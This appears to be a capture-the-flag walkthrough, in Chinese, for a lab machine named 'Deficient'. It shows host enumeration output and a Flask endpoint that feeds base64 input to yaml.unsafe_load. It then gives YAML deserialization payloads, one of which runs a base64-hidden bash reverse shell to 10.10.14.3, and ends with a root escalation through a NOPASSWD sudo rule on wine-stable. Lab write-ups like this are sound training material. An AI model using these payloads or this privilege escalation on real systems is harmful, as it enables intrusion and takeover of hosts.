# Deficient

## 信息收集

```bash
Detected ss and lsof, executing related commands...
Port: 5000, PID: 725
—> Command: python3 /opt/projects/api/index.py 
Port: 53, PID: 560
—> Command: /lib/systemd/systemd-resolved 
Port: 22, PID: 778
—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
Port: 5432, PID: 826
—> Command: /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf 

## ———————————————————————————— ##

Nginx is not installed.

## ———————————————————————————— ##

Apache is not installed.

## ———————————————————————————— ##

Checking /etc/sudoers (active configurations only):
  Defaults      env_reset
  Defaults      mail_badpass
  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  root  ALL=(ALL:ALL) ALL
  trajan        ALL=(ALL:root) NOPASSWD: /usr/bin/psql
  trajan        ALL=(ALL:root) NOPASSWD: /usr/bin/psysh
  trajan  ALL=(ALL:root) NOPASSWD: /usr/bin/wine-stable
  %sudo ALL=(ALL:ALL) ALL
———
Finding SUID files:
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/wine-stable
/usr/bin/chfn
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/passwd
/snap/snapd/7264/usr/lib/snapd/snap-confine
/snap/snapd/11588/usr/lib/snapd/snap-confine
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
———
Finding files with special capabilities:
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/lib/i386-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
  /usr/bin/wine-stable = cap_setuid+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
———
No nginx or apache2 process is running.
```

## Python HTTP Server

```python title="/opt/projects/api/index.py"
#!/usr/bin/env python3
import flask
import yaml
from flask import request
import base64

app = flask.Flask(__name__)
app.config["DEBUG"] = False


@app.route('/', methods=['GET'])
def home():
    return "<h1>Archive</h1><p>internal API.</p>"


@app.route('/search', methods=['GET'])
def search():
    para = request.args
    data = para.get('yaml')
    d = base64.b64decode(data)
    de = yaml.unsafe_load(d)
    return de

app.run('0.0.0.0')
```

打 Python 的 yaml 反序列化

[j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)

或者

```bash
echo '!!python/object/apply:subprocess.check_output [["cat","/opt/flag.txt"]]' | base64
# 赛棍玩法
echo '!!python/object/apply:subprocess.check_output [["bash", "-c", "$(echo KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy84MCAwPiYxKSAm | base64 -d | bash)"]]' | base64
```

## 提权

上传一个 Windows 的 `cmd.exe` 之后

```bash
sudo /usr/bin/wine-stable cmd.exe
```
